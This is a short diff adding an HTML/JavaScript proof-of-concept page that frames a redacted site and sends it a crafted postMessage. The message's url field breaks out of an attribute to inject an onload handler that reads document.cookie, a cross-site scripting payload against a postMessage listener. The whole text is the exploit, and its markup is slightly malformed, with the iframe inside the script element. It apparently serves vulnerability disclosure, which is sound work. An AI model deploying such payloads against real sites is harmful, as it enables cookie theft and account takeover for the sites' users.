@@ -1,0 +1,12 @@
+<script>
+function SendMessage() {
+  var IframeElement = document.getElementById('VulnerableSiteIframe');
+  var message = {"message":"e:openFloatingPage","data":{
+   "id":"1234gghq",
+   "name":"tayba",
+   "url":"https://cdn.website.mollie.com\"+onload=alert(document.cookie)"
+}};
+  IframeElement.contentWindow.postMessage(message, '*');
+};
+<iframe id="VulnerableSiteIframe" height="400" width="1024" src="https://redacted.com/download.php?p=jjjj" onload="SendMessage()"></iframe>
+</script>
